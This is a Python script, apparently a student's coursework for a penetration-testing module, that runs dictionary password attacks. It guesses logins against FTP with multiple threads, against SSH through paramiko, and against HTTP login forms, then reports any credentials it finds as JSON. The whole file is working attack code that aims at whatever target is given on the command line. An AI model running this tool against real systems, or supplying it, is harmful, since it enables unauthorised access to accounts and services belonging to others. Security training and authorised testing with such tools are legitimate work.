import argparse
import datetime
import ftplib
import json
import os
import queue
import sys
import threading
import time
import paramiko
import requests


def load_wordlist(path):
    if not os.path.exists(path):
        print(f"[-] Error: No se encontró el diccionario en '{path}'")
        return None

    passwords = []
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if password:
                    passwords.append(password)
    except Exception as e:
        print(f"[-] Error al leer el archivo de diccionario: {e}")
        return None

    return passwords


class FTPBruteForcer:
    def __init__(self, target_ip, username, wordlist_path, threads=5):
        """Inicializa el módulo de ataque de diccionario contra FTP."""
        self.target_ip = target_ip
        self.ip_address = target_ip
        self.username = username
        self.wordlist_path = wordlist_path
        self.port = 21
        self.num_threads = max(1, threads)
        self.word_queue = queue.Queue()
        self.found_password = None
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_attack = False
        self.null_session_established = False
        self.shares = []
        self.users = [username]
        self.error_message = ""

    def _load_wordlist(self):
        passwords = load_wordlist(self.wordlist_path)
        if passwords is None:
            return False

        for password in passwords:
            self.word_queue.put(password)

        return True

    def _try_login(self, password):
        """Realiza un intento de login FTP con ftplib."""
        ftp = ftplib.FTP()
        try:
            ftp.connect(self.target_ip, self.port, timeout=4)
            ftp.login(user=self.username, passwd=password)
            with self.lock:
                print(f"\n[+] ¡EXITO FTP! Credenciales encontradas -> {self.username}:{password}")
            ftp.quit()
            return True
        except ftplib.error_perm:
            with self.lock:
                print(f"[-] Intento FTP fallido -> {self.username}:{password}")
        except Exception as e:
            with self.lock:
                print(f"[!] Error FTP de red/conexión: {e}")
        finally:
            try:
                ftp.close()
            except Exception:
                pass
        return False

    def _worker(self):
        while not self.stop_attack:
            try:
                password = self.word_queue.get_nowait()
            except queue.Empty:
                return

            if self._try_login(password):
                with self.lock:
                    self.found_password = password
                    self.found_credentials = [password]
                    self.stop_attack = True
            self.word_queue.task_done()

    def run(self):
        """Ejecuta el ataque de fuerza bruta coordinando los hilos."""
        print(f"[*] Iniciando ataque de diccionario FTP en {self.target_ip}...")
        print(f"[*] Usuario objetivo: '{self.username}'")

        if not self._load_wordlist():
            self.error_message = "No se pudo cargar el diccionario."
            status_final = "error"
        elif self.word_queue.empty():
            self.error_message = "El diccionario proporcionado está vacío."
            status_final = "error"
        else:
            threads_list = []
            for _ in range(min(self.num_threads, self.word_queue.qsize())):
                t = threading.Thread(target=self._worker)
                t.daemon = True
                t.start()
                threads_list.append(t)

            for t in threads_list:
                t.join()

            if self.found_password:
                status_final = "success"
                self.error_message = ""
            else:
                status_final = "failed"
                self.error_message = "Ataque terminado. No se encontró la contraseña en el diccionario."

        return {
            "modulo": "ataque a servicios de autenticacion",
            "grupo": 3,
            "estudiante": "E3",
            "target": self.ip_address,
            "timestamp": datetime.datetime.now().isoformat(),
            "status": status_final,
            "data": {
                "port": self.port,
                "null_session_established": self.null_session_established,
                "shares": self.shares,
                "users": self.users,
                "credenciales_encontradas": self.found_credentials,
            },
            "error_message": self.error_message,
        }


def ssh_brute_force(target_host, username, wordlist_path):
    print(f"[*] Iniciando ataque de diccionario SSH en {target_host}...")
    passwords = load_wordlist(wordlist_path)
    found_passwords = []
    error_message = ""
    users = [username]

    if passwords is None:
        error_message = "No se pudo cargar el diccionario SSH."
        status_final = "error"
    else:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        status_final = "failed"
        for password in passwords:
            print(f"[*] Probando SSH: {username}:{password}")
            try:
                ssh_client.connect(
                    hostname=target_host,
                    username=username,
                    password=password,
                    timeout=3,
                    banner_timeout=3,
                )
                print(f"\n[+] ¡EXITO SSH! Contraseña encontrada: {password}")
                ssh_client.close()
                found_passwords = [password]
                status_final = "success"
                break
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException as e:
                print(f"[-] Error SSH: {e}")
                continue
            except Exception as e:
                error_message = f"Error de red SSH: {e}"
                status_final = "error"
                break

        if status_final == "failed" and not error_message:
            error_message = "Ataque SSH terminado. No se encontró la contraseña." 

    return {
        "modulo": "ataque a servicios de autenticacion",
        "grupo": 3,
        "estudiante": "E3",
        "target": target_host,
        "timestamp": datetime.datetime.now().isoformat(),
        "status": status_final,
        "data": {
            "port": 22,
            "null_session_established": False,
            "shares": [],
            "users": users,
            "credenciales_encontradas": found_passwords,
        },
        "error_message": error_message,
    }


def http_brute_force(url, username, wordlist_path, user_field, pass_field, success_string, success_status, sleep_time, verbose):
    print(f"[*] Iniciando ataque de diccionario HTTP en {url}...")
    passwords = load_wordlist(wordlist_path)
    found_passwords = []
    error_message = ""
    users = [username]

    if passwords is None:
        error_message = "No se pudo cargar el diccionario HTTP."
        status_final = "error"
    else:
        status_final = "failed"
        for idx, password in enumerate(passwords, start=1):
            if verbose:
                print(f"Intento {idx}/{len(passwords)}: {username}:{password}")

            try:
                response = requests.post(url, data={user_field: username, pass_field: password}, timeout=5)
            except requests.RequestException as exc:
                error_message = f"Error de conexión HTTP: {exc}"
                status_final = "error"
                break

            success = False
            if success_status is not None and response.status_code == success_status:
                success = True
            if success_string and success_string in response.text:
                success = True

            if verbose and success_string is None and success_status is None:
                print(f"Status: {response.status_code}, longitud de respuesta: {len(response.text)}")

            if success:
                print(f"\n[+] ¡EXITO HTTP! Contraseña encontrada: {password}")
                found_passwords = [password]
                status_final = "success"
                break

            time.sleep(sleep_time)

        if status_final == "failed" and not error_message:
            error_message = "Ataque HTTP terminado. No se encontró la contraseña."

    return {
        "modulo": "ataque a servicios de autenticacion",
        "grupo": 3,
        "estudiante": "E3",
        "target": url,
        "timestamp": datetime.datetime.now().isoformat(),
        "status": status_final,
        "data": {
            "port": None,
            "null_session_established": False,
            "shares": [],
            "users": users,
            "credenciales_encontradas": found_passwords,
        },
        "error_message": error_message,
    }


def parse_args():
    parser = argparse.ArgumentParser(
        description="Script de prueba con diccionario para FTP, SSH y formulario HTTP.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--mode",
        choices=["ftp", "ssh", "http"],
        default="ftp",
        help="Modo de ataque a ejecutar.",
    )
    parser.add_argument("--target", help="IP o host objetivo para FTP/SSH.")
    parser.add_argument("--url", help="URL del formulario de login HTTP.")
    parser.add_argument("--username", required=True, help="Nombre de usuario a probar.")
    parser.add_argument("--wordlist", required=True, help="Ruta al archivo con contraseñas.")
    parser.add_argument("--threads", type=int, default=5, help="Número de hilos para FTP.")
    parser.add_argument("--user-field", default="username", help="Nombre del campo de usuario en el formulario HTTP.")
    parser.add_argument("--pass-field", default="password", help="Nombre del campo de contraseña en el formulario HTTP.")
    parser.add_argument(
        "--success-string",
        default=None,
        help="Cadena que indica éxito en la respuesta HTTP.",
    )
    parser.add_argument(
        "--success-status",
        type=int,
        default=None,
        help="Código HTTP que indica éxito en la respuesta.",
    )
    parser.add_argument(
        "--sleep",
        type=float,
        default=0.5,
        help="Segundos a esperar entre intentos HTTP.",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Muestra información detallada de cada intento HTTP.",
    )
    return parser.parse_args()


def main():
    args = parse_args()

    if args.mode in ["ftp", "ssh"] and not args.target:
        print("[-] Error: --target es obligatorio para los modos ftp y ssh.")
        sys.exit(1)
    if args.mode == "http" and not args.url:
        print("[-] Error: --url es obligatorio para el modo http.")
        sys.exit(1)

    if args.mode == "ftp":
        brute = FTPBruteForcer(args.target, args.username, args.wordlist, threads=args.threads)
        result = brute.run()
    elif args.mode == "ssh":
        result = ssh_brute_force(args.target, args.username, args.wordlist)
    else:
        result = http_brute_force(
            args.url,
            args.username,
            args.wordlist,
            args.user_field,
            args.pass_field,
            args.success_string,
            args.success_status,
            args.sleep,
            args.verbose,
        )

    print(json.dumps(result, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
